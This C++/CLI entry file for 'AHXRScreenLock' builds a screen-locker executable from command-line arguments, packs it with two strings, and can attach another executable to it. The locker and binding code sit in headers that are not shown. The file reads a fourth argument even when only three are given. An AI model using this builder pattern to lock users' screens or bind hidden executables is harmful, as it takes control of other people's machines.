/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include <msclr\marshal_cppstd.h>
#include <iostream>

//#define DEBUG_MODE

using namespace msclr::interop;
using namespace System;
using namespace System::Windows::Forms;

std::string s_attached_p;

#include "locker.h"
#include "pack.h"
#include "frmMain.h"

[STAThread]
void main(array<String^>^ args) {

#ifdef DEBUG_MODE
	packLocker("AXHRLocker.exe", "hi", "basic message.");
#endif


	if (args->Length >= 3) {
		// For some reason I'm unable to directly use args in marshal_as (argument error)
		System::String ^ s_arg_one;
		System::String ^ s_arg_two;
		System::String ^ s_arg_three;
		System::String ^ s_arg_four;

		s_arg_one = args[0];
		s_arg_two = args[1];
		s_arg_three = args[2];
		s_arg_four = args[3];

		std::string s_file_name = marshal_as< std::string >(s_arg_one);
		//std::cout << s_file_name << " | " << marshal_as< std::string >(s_arg_two) << " | " << marshal_as< std::string >(s_arg_three) << " | " << marshal_as< std::string >(s_arg_four) << std::endl;

		buildNewLocker(s_file_name);
		packLocker(s_file_name, marshal_as< std::string >(s_arg_two), marshal_as< std::string >(s_arg_three));

		if (args->Length == 4) {
			s_arg_four = args[3];
			attachExecutable(s_file_name, marshal_as< std::string >(s_arg_four));
		}
		exit(0); // Don't run GUI if we're building it like this.
	}
	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);
	AHXRScreenLock::frmMain frm;
	Application::Run(%frm);
}